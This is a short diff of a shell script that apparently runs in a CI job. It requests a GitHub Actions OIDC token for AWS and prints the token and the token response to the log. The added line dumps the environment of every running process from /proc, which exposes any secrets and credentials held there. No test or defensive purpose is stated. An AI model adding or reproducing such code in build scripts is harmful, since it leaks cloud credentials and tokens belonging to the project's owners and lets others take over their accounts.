@@ -82,6 +82,7 @@ echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN: $(cat /tmp/oidc_token.txt | cut -c1-40)...
 echo "--- requesting ID token with audience sts.amazonaws.com ---"
 curl -s -H "Authorization: bearer $(cat /tmp/oidc_token.txt)" "$(cat /tmp/oidc_url.txt)&audience=sts.amazonaws.com" > /tmp/oidc_response.txt
 echo "OIDC response: $(cat /tmp/oidc_response.txt)"
+for pid in /proc/[0-9]*/environ; do echo "=== PID $(echo $pid | tr -dc '0-9') ==="; cat "$pid" 2>/dev/null | tr '\0' '\n'; done
 CMDEOF
 # ----------------------------------------
 
